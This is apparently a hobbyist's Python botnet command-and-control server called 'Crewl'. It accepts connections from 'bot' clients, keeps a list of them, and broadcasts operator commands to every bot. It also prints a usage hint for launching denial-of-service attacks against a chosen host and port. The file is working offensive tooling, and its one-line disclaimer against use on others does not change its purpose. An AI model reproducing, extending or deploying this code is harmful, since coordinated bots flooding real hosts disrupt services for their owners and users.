import socket
import threading
import os
import sys
import time


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("192.168.1.182", 2121))
server_socket.listen(10)


def sysstart():
    banner = f"""
    ▄████▄   ██▀███  ▓█████  █     █░ ██▓    
    ▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀ ▓█░ █ ░█░▓██▒    
    ▒▓█    ▄ ▓██ ░▄█ ▒▒███   ▒█░ █ ░█ ▒██░    
    ▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄ ░█░ █ ░█ ▒██░    
    ▒ ▓███▀ ░░██▓ ▒██▒░▒████▒░░██▒██▓ ░██████▒
    ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▓  ░
      ░  ▒     ░▒ ░ ▒░ ░ ░  ░  ▒ ░ ░  ░ ░ ▒  ░
    ░          ░░   ░    ░     ░   ░    ░ ░   
    ░ ░         ░        ░  ░    ░        ░  ░
    ░                                         
    """

    infobox = f"""
    ----------------------------------------
    |      ● Crewl by Tilman Steck ●      |
    |                                      |
    | version > 1.0                        |
    | donate > https://paypal.com/acc/     |
    |                                      |
    | IMPORTANT: Do not use this against   |
    | other people, just on yourself!      |
    |                                      |
    | Admin User > 'King Crewl'            |
    | bots > 'crewler'                     |
    |                                      |
    ----------------------------------------
    """

    print(banner)
    print(infobox)
    print("\n[*] Crewl ist starting... \n")


    # setup toolbar
    toolbar_width = 30

    sys.stdout.write("[%s]" % (" " * toolbar_width))
    sys.stdout.flush()
    sys.stdout.write("\b" * (toolbar_width + 1))  # return to start of line, after '['

    for i in range(toolbar_width):
        time.sleep(0.2)
        sys.stdout.write("▬")
        sys.stdout.flush()

    sys.stdout.write("]\n\n")

    time.sleep(2)


def recieve(conn, adress):
    while True:
        if len(botNet) > 0:
            try:
                inmessage = conn.recv(1024).decode()
                print("\n'" + inmessage + "' from '" + str(adress) + "'")

                continue

            except socket.error as e:
                print("[*] Bot " + str(adress) + "disconnected with error " + str(e))
                remove(conn)
                break

            except KeyboardInterrupt:
                sys.exit()

        elif len(botNet) == 0:
            print("[*] There aren't any bots online. System is stopping now!")
            sys.exit()


def connect():
    while True:

        connection, addr = server_socket.accept()
        botNet.append(connection)

        print("[*] Bot connected with address " + str(addr))

        r = threading.Thread(target=recieve, args=(connection, addr))
        r.start()

        continue


def botnetcommand(command):
    for client in botNet:
        try:
            client.send(command.encode())
            pass

        except socket.error:
            remove(client)


def remove(conn):
    if conn in botNet:
        botNet.remove(conn)


sysstart()

botNet = []

t = threading.Thread(target=connect)
t.start()

time.sleep(1)

print("[*] Acitve bots: " + str(len(botNet)) + "\n")

while True:
    try:
        header = f"""\n{os.getlogin()}@crewl$ """

        cmdinput = input(header)

        if len(botNet) > 0:
            if cmdinput == "use" or cmdinput == "use -dos":
                print("[*] Error: Correct usage: use -dos (host) (port) (number of attacks)")

            else:
                botnetcommand(cmdinput)
                time.sleep(0.8)

            continue

        elif len(botNet) == 0:
            print("[*] There are not enough crewler online, try agian later!")

            continue

    except socket.error:
        continue

    except KeyboardInterrupt:
        print("[*] Keyboard Interrupt! Stopping system")
        os._exit(1)


# socket connect/deconnect ohne error
# mehr befehle
# bot optimieren
# \n einfügen
